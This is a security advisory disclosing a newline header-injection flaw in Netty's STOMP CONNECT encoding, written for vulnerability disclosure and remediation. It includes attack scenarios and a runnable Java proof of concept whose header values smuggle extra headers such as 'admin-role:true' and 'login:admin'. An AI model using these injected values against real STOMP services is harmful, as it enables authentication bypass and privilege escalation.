# [M] Netty: STOMP CONNECT Frame Header Injection in Netty

## Summary
Severity: Medium
Advisory: GHSA-3g8r-4pfx-jmfh
CVE: CVE-2026-59920
CWE: CWE-93
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-07-22
Source: https://github.com/advisories/GHSA-3g8r-4pfx-jmfh
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-stomp` — affected >=4.2.0.Final <4.2.16.Final
- Maven: `io.netty:netty-codec-stomp` — affected >=0 <4.1.136.Final

## Details
# Security Vulnerability Report: STOMP CONNECT Frame Header Injection in Netty

## 1. Vulnerability Summary

| Field | Value |
|-------|-------|
| **Product** | Netty |
| **Version** | 4.2.12.Final (and all prior versions with codec-stomp) |
| **Component** | `io.netty.handler.codec.stomp.StompSubframeEncoder` |
| **Vulnerability Type** | CWE-93: Improper Neutralization of CRLF Sequences / CWE-113: Improper Neutralization of CRLF in HTTP Headers |
| **Impact** | STOMP Header Injection / Authentication Bypass |
| **CVSS 3.1 Score** | **6.5 (Medium)** |
| **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` |
| **Attack Vector** | Network |
| **Attack Complexity** | Low |
| **Privileges Required** | Low |
| **User Interaction** | None |
| **Scope** | Unchanged |
| **Confidentiality Impact** | None |
| **Integrity Impact** | High |
| **Availability Impact** | None |

## 2. Affected Components

- `io.netty.handler.codec.stomp.StompSubframeEncoder` — `encodeHeaders()` method (lines 174-200)
- `io.netty.handler.codec.stomp.StompSubframeEncoder` — `shouldEscape()` method (lines 214-216)

## 3. Vulnerability Description

The Netty STOMP codec encoder (`StompSubframeEncoder`) intentionally skips the `escape()` function for `CONNECT` and `CONNECTED` commands. This means that newline characters (`\n`) in header values of CONNECT frames are written directly to the output, allowing an attacker to inject additional STOMP headers.

### Root Cause

In `StompSubframeEncoder.java`, the `shouldEscape()` method (lines 214-216) explicitly excludes CONNECT and CONNECTED commands from escaping:

```java
private static boolean shouldEscape(StompCommand command) {
    return command != StompCommand.CONNECT && command != StompCommand.CONNECTED;
}
```

When `shouldEscape()` returns `false`, header values are written without any escaping (line 195):

```java
CharSequence headerValue = shouldEscape ? escape(entry.getValue()) : entry.getValue();
ByteBufUtil.writeUtf8(buf, headerValue);  // Raw \n written to output
buf.writeByte(StompConstants.LF);
```

For other commands (SEND, SUBSCRIBE, etc.), the `escape()` method (lines 218-240) correctly converts `\n` to `\\n`, `\r` to `\\r`, `:` to `\\c`, and `\\` to `\\\\`.

### STOMP Specification Context and Security Analysis

The STOMP 1.2 specification (Section 10, Value Encoding) states that CONNECT and CONNECTED frames should **not use escaping**, to maintain backwards compatibility with STOMP 1.0 clients that do not understand escape sequences.

**However, "no escaping" does not mean "no validation".** The specification's intent is that CONNECT headers should not use the `\n` → `\\n` escape notation. It does **not** mandate that implementations must accept raw newline characters within header values. There is a critical distinction:

- **Escaping** = converting `\n` to `\\n` in the wire format (spec says: don't do this for CONNECT)
- **Validation** = rejecting header values that contain `\n` (spec does not prohibit this)

Netty's implementation conflates these two concepts: by skipping `escape()`, it also skips **all** protection against newline injection. The correct behavior would be to skip escaping but still **reject** values containing raw newline characters, since such values are inherently malformed — no legitimate STOMP 1.0 or 1.2 header value should contain a raw `\n`.

This is analogous to Netty's own SMTP fix (GHSA-jq43-27x9-3v86): SMTP parameters don't need escaping either, but Netty added validation to reject CRLF in parameters. The same principle should apply here.

**Additionally**, Netty's own test suite explicitly validates this non-escaping behavior in `StompSubframeEncoderTest.java:126-143` (`testNotEscapeStompHeadersForConnectCommand`), confirming that this is a deliberate design choice — but the test only verifies that escaping is skipped, not that injection is possible. The security implications were not considered.

**Summary**: The vulnerability exists because:

1. Header values in CONNECT frames are **neither escaped nor validated** for newlines
2. A raw newline in a header value creates a **new header line** on the wire
3. The STOMP broker parses each line as a separate header
4. The fix should **validate** (reject `\n`) rather than **escape** (convert `\n` to `\\n`), maintaining spec compliance

## 4. Exploitability Prerequisites

This vulnerability is exploitable when **all** of the following conditions are met:

1. The application uses Netty's `codec-stomp` module to encode STOMP frames
2. User-controlled input is placed into header values of a `CONNECT` or `CONNECTED` frame
3. The application does **not** perform its own newline sanitization
4. The downstream STOMP broker processes the injected headers (broker-dependent)

**Typical affected use cases**:
- STOMP proxy/gateway applications that forward or construct CONNECT frames with user-supplied credentials
- Web-to-STOMP bridge applications (e.g., WebSocket-STOMP proxies) where login/passcode come from web forms
- Multi-tenant STOMP platforms where tenant-specific headers are injected into CONNECT frames

## 5. Attack Scenarios

### Scenario 1: Authentication Bypass via Header Injection

An attacker who can control any header value in a CONNECT frame can inject additional authentication-related headers:

```java
DefaultStompFrame frame = new DefaultStompFrame(StompCommand.CONNECT);
frame.headers().set(StompHeaders.HOST, "localhost");
frame.headers().set(StompHeaders.LOGIN, "guest");
// Attacker injects a role header via \n in passcode
frame.headers().set(StompHeaders.PASSCODE, "password\nadmin-role:true");
```

**Wire format sent to broker:**
```
CONNECT
host:localhost
login:guest
passcode:password
admin-role:true        <-- INJECTED HEADER
                       <-- Empty line (end of headers)
\0
```

The broker receives 5 headers instead of the intended 4. If the broker checks for an `admin-role` header to grant elevated privileges, the attacker bypasses authentication.

### Scenario 2: Subscription Hijacking

```java
frame.headers().set(StompHeaders.PASSCODE, "pass\nhost:evil-broker.com");
```

This overwrites the `host` header, potentially redirecting the connection to an attacker-controlled STOMP broker (depending on broker implementation).

### Scenario 3: Header Overwrite

```java
frame.headers().set(StompHeaders.LOGIN, "user\nlogin:admin");
```

**Wire format:**
```
CONNECT
login:user
login:admin            <-- INJECTED, may override first
...
```

Some brokers use the last value when duplicate headers exist, allowing the attacker to escalate to the `admin` account.

## 6. Proof of Concept

### Full Runnable PoC Source Code (StompConnectHeaderInjectionPoC.java)

```java
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.stomp.*;

import java.nio.charset.StandardCharsets;

/**
 * PoC: STOMP CONNECT/CONNECTED Frame Header Injection Vulnerability
 *
 * Demonstrates that StompSubframeEncoder skips escape() for CONNECT and
 * CONNECTED commands, allowing \n injection in header values to create
 * additional STOMP headers.
 */
public class StompConnectHeaderInjectionPoC {

    public static void main(String[] args) {
        System.out.println("=== Netty STOMP CONNECT Header Injection PoC ===\n");

        testConnectHeaderInjection();
        testConnectVsOtherCommand();

        System.out.println("\n=== PoC Complete ===");
    }

    /**
     * Test 1: CONNECT command header injection via \n in value
     */
    static void testConnectHeaderInjection() {
        System.out.println("[TEST 1] CONNECT Header Value Injection");
        System.out.println("-----------------------------------------");

        // Craft a CONNECT frame with \n in passcode value
        DefaultStompHeaders headers = new DefaultStompHeaders();
        headers.set(StompHeaders.HOST, "localhost");
        headers.set(StompHeaders.ACCEPT_VERSION, "1.2");
        headers.set(StompHeaders.LOGIN, "user");
        headers.set(StompHeaders.PASSCODE, "password\nadmin-role:true");

        DefaultStompFrame frame = new DefaultStompFrame(StompCommand.CONNECT);
        frame.headers().setAll(headers);

        EmbeddedChannel channel = new EmbeddedChannel(new StompSubframeEncoder());
        channel.writeOutbound(frame);

        ByteBuf output = channel.readOutbound();
        String encoded = output.toString(StandardCharsets.UTF_8);
        output.release();
        channel.finishAndReleaseAll();

        System.out.println("Input passcode: \"password\\nadmin-role:true\"");
        System.out.println();
        System.out.println("Encoded STOMP frame:");
        System.out.println("---");
        // Show with visible control chars
        for (String line : encoded.split("\n", -1)) {
            System.out.println("  " + line.replace("\r", "\\r").replace("\0", "\\0"));
        }
        System.out.println("---");

        // Check if the injected header appears as a separate line
        boolean hasInjectedHeader = false;
        String[] lines = encoded.split("\n");
        for (String line : lines) {
            if (line.startsWith("admin-role:")) {
                hasInjectedHeader = true;
                break;
            }
        }

        System.out.println();
        System.out.println("Injected 'admin-role' appears as separate header: " + hasInjectedHeader);
        System.out.println("VULNERABLE: " + (hasInjectedHeader ?
            "YES - Header injection in CONNECT frame!" : "NO"));

        // Count actual STOMP headers (lines between command and empty line)
        int headerCount = 0;
        boolean inHeaders = false;
        for (String line : lines) {
            if (line.equals("CONNECT")) {
                inHeaders = true;
                continue;
            }
            if (inHeaders && line.trim().isEmpty()) break;
            if (inHeaders && line.contains(":")) headerCount++;
        }
        System.out.println("Expected headers: 4 (host, accept-version, login, passcode)");
        System.out.println("Actual headers:   " + headerCount);
        System.out.println();
    }

    /**
     * Test 2: Compare CONNECT (no escape) vs SEND (with escape)
     */
    static void testConnectVsOtherCommand() {
        System.out.println("[TEST 2] CONNECT vs SEND Escape Comparison");
        System.out.println("--------------------------------------------");

        String maliciousValue = "value\ninjected:evil";

        // Test CONNECT (no escape)
        {
            DefaultStompHeaders headers = new DefaultStompHeaders();
            headers.set(StompHeaders.HOST, "localhost");
            headers.set("custom", maliciousValue);

            DefaultStompFrame frame = new DefaultStompFrame(StompCommand.CONNECT);
            frame.headers().setAll(headers);
            EmbeddedChannel channel = new EmbeddedChannel(new StompSubframeEncoder());
            channel.writeOutbound(frame);

            ByteBuf output = channel.readOutbound();
            String encoded = output.toString(StandardCharsets.UTF_8);
            output.release();
            channel.finishAndReleaseAll();

            System.out.println("CONNECT frame with custom=\"value\\ninjected:evil\":");
            System.out.println("  Encoded: " + encoded.replace("\n", "\\n").replace("\0", "\\0"));

            boolean hasRawNewline = encoded.contains("value\ninjected:evil");
            System.out.println("  Raw \\n in output: " + hasRawNewline);
            System.out.println("  VULNERABLE: " + (hasRawNewline ? "YES" : "NO"));
        }

        System.out.println();

        // Test SEND (with escape)
        {
            DefaultStompHeaders headers = new DefaultStompHeaders();
            headers.set(StompHeaders.DESTINATION, "/queue/test");
            headers.set("custom", maliciousValue);

            DefaultStompFrame frame = new DefaultStompFrame(StompCommand.SEND);
            frame.headers().setAll(headers);
            EmbeddedChannel channel = new EmbeddedChannel(new StompSubframeEncoder());
            channel.writeOutbound(frame);

            ByteBuf output = channel.readOutbound();
            String encoded = output.toString(StandardCharsets.UTF_8);
            output.release();
            channel.finishAndReleaseAll();

            System.out.println("SEND frame with custom=\"value\\ninjected:evil\":");
            System.out.println("  Encoded: " + encoded.replace("\n", "\\n").replace("\0", "\\0"));

            boolean hasEscapedNewline = encoded.contains("value\\ninjected\\cevil");
            boolean hasRawNewline = encoded.contains("value\ninjected:evil");
            System.out.println("  Escaped \\n: " + hasEscapedNewline);
            System.out.println("  Raw \\n:     " + hasRawNewline);
            System.out.println("  SAFE: " + (hasEscapedNewline && !hasRawNewline ? "YES" : "NO"));
        }
        System.out.println();
    }
}
```

### How to Compile and Run

```bash
# Build Netty (skip tests for speed)
./mvnw install -pl common,buffer,codec,codec-stomp,transport -DskipTests -Dcheckstyle.skip=true \
  -Denforcer.skip=true -Djapicmp.skip=true -Danimal.sniffer.skip=true \
  -Drevapi.skip=true -Dforbiddenapis.skip=true -Dspotbugs.skip=true -q

# Set classpath
JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar" -path "*/4.2.12.Final/*" \
  | grep -v sources | grep -v javadoc | tr '\n' ':')

# Compile and run
javac -cp "$JARS" StompConnectHeaderInjectionPoC.java
java -cp "$JARS:." StompConnectHeaderInjectionPoC
```

### PoC Execution Output (Verified on Netty 4.2.12.Final)

```
=== Netty STOMP CONNECT Header Injection PoC ===

[TEST 1] CONNECT Header Value Injection
-----------------------------------------
Input passcode: "password\nadmin-role:true"

Encoded STOMP frame:
---
  CONNECT
  host:localhost
  accept-version:1.2
  login:user
  passcode:password
  admin-role:true          <-- INJECTED HEADER

  \0
---

Injected 'admin-role' appears as separate header: true
VULNERABLE: YES - Header injection in CONNECT frame!
Expected headers: 4 (host, accept-version, login, passcode)
Actual headers:   5

[TEST 2] CONNECT vs SEND Escape Comparison
--------------------------------------------
CONNECT frame with custom="value\ninjected:evil":
  Encoded: CONNECT\nhost:localhost\ncustom:value\ninjected:evil\n\n\0
  Raw \n in output: true
  VULNERABLE: YES

SEND frame with custom="value\ninjected:evil":
  Encoded: SEND\ndestination:/queue/test\ncustom:value\ninjected\cevil\n\n\0
  Escaped \n: true
  Raw \n:     false
  SAFE: YES


=== PoC Complete ===
```

### Key Observation

The PoC demonstrates a clear inconsistency:
- **CONNECT** command: `\n` is written **raw** → header injection succeeds
- **SEND** command: `\n` is escaped to `\\n` → header injection prevented

## 7. Impact Analysis

| Impact Category | Description |
|----------------|-------------|
| **Authentication** | Injected headers may bypass broker authentication logic |
| **Authorization** | Role escalation via injected role/permission headers |
| **Integrity** | Modification of connection parameters (host, version, etc.) |
| **Broker-Specific** | Impact varies by STOMP broker implementation (RabbitMQ, ActiveMQ, etc.) |

### Affected Brokers

This vulnerability affects any application using Netty's STOMP encoder to communicate with STOMP brokers. The actual exploitability depends on the broker's handling of unexpected headers:

- **RabbitMQ**: Uses specific headers for authentication; additional headers are typically ignored but may affect plugins
- **ActiveMQ**: May process custom headers for internal routing
- **Custom Brokers**: Most likely to be affected if they trust all received headers

## 8. Remediation Recommendations

### Option 1: Validate CONNECT Header Values (Recommended)

Add newline validation for CONNECT/CONNECTED frames instead of skipping escaping entirely:

```java
private static void encodeHeaders(StompHeadersSubframe frame, ByteBuf buf) {
    StompCommand command = frame.command();
    ByteBufUtil.writeUtf8(buf, command.toString());
    buf.writeByte(StompConstants.LF);

    boolean shouldEscape = shouldEscape(command);
    for (Entry<CharSequence, CharSequence> entry : frame.headers()) {
        CharSequence headerKey = entry.getKey();
        CharSequence headerValue = entry.getValue();

        if (shouldEscape) {
            headerKey = escape(headerKey);
            headerValue = escape(headerValue);
        } else {
            // For CONNECT/CONNECTED: don't escape but REJECT newlines
            validateNoNewlines(headerKey, "header name");
            validateNoNewlines(headerValue, "header value");
        }

        ByteBufUtil.writeUtf8(buf, headerKey);
        buf.writeByte(StompConstants.COLON);
        ByteBufUtil.writeUtf8(buf, headerValue);
        buf.writeByte(StompConstants.LF);
    }
    buf.writeByte(StompConstants.LF);
}

private static void validateNoNewlines(CharSequence value, String type) {
    for (int i = 0; i < value.length(); i++) {
        char c = value.charAt(i);
        if (c == '\n' || c == '\r') {
            throw new IllegalArgumentException(
                "STOMP CONNECT " + type + " contains illegal newline at index " + i);
        }
    }
}
```

### Option 2: Apply Escaping to All Commands

Simply remove the CONNECT/CONNECTED exception:

```java
private static boolean shouldEscape(StompCommand command) {
    return true; // Always escape
}
```

Note: This may break compatibility with STOMP 1.0 clients, but is the most secure approach.

## 9. References

- [STOMP 1.2 Specification](https://stomp.github.io/stomp-specification-1.2.html)
- [STOMP 1.2 Section 10: Value Encoding](https://stomp.github.io/stomp-specification-1.2.html#Value_Encoding)
- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)
- [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection (similar pattern)](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86)

## References
- https://github.com/netty/netty/security/advisories/GHSA-3g8r-4pfx-jmfh
- https://github.com/netty/netty
- https://github.com/netty/netty/releases/tag/netty-4.1.136.Final
- https://github.com/netty/netty/releases/tag/netty-4.2.16.Final
